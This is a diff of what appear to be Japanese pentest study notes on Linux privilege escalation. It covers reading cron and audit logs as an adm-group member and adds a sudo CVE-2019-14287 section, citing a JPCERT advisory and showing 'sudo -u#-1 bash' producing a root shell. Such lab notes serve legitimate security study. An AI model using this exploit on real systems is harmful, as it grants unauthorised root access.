@@ -52,7 +52,6 @@ cat /var/spool/cron/crontabs/*                cat: '/var/spool/cron/crontabs/*':
 ## 監査ログ
 - ユーザがadmグループにいるとき、監査ログが確認できる。その他/ver/logの確認も。
 
-
 ```sh
 cry0l1t3@academy:/$ id
 uid=1002(cry0l1t3) gid=1002(cry0l1t3) groups=1002(cry0l1t3),4(adm)
@@ -71,4 +70,14 @@ NOTE - using built-in logs:
 3. 08/12/2020 02:28:24 89 0 ? 1 sh "whoami",<nl>
 4. 08/12/2020 02:28:28 90 0 ? 1 sh "exit",<nl>
 5. 08/12/2020 02:28:37 93 0 ? 1 sh "/bin/bash -i",<nl>
+```
+
+## sudo
+sudo 1.8.28 より前のバージョンでは、CVE-2019-14287を適用できる場合がある。(https://www.jpcert.or.jp/newsflash/2019101601.html)
+```sh
+hugo@blunder:~$ sudo --version
+Sudo version 1.8.25p1
+hugo@blunder:~$ sudo -u#-1 bash
+root@blunder:/home/hugo# id
+uid=0(root) gid=1001(hugo) groups=1001(hugo)
 ```
